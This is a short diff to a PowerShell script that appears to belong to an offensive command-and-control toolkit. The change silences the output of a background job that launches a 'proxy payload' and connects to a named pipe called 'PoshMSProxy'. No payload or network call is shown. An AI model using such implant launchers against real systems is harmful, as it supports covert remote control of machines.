@@ -20,7 +20,7 @@
 
 }
 add-Type -assembly "System.Core"
-start-job -ScriptBlock $scriptblock -ArgumentList @("PoshMSProxy",$proxypayload)
+start-job -ScriptBlock $scriptblock -ArgumentList @("PoshMSProxy",$proxypayload) | Out-Null
 $pi = new-object System.IO.Pipes.NamedPipeClientStream(".", "PoshMSProxy");
 
 
